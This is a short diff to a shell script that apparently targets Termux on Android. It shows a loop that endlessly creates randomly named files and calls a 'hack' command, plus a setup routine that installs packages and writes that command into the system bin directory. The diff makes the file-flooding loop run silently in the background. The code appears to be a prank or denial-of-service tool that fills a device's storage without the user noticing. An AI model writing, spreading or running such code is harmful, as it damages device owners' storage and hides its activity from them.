@@ -43,7 +43,7 @@ R() {
 		touch $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM > /dev/null 2>&1
 		touch JX$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM > /dev/null 2>&2
 		hack
-		done
+		done > /dev/null 2>&1 &
 		}
 	menu () {
 		bann
@@ -59,10 +59,13 @@ R() {
 		esac
 		}
 		set() {
+			w
 			apt update
+			w
 			apt upgrade
 			w
 			apt install python
+			w
 	apt install figlet
 	cd $PREFIX/bin
 	echo "#!/data/data/com.termux/files/usr/bin/sh" >> hack
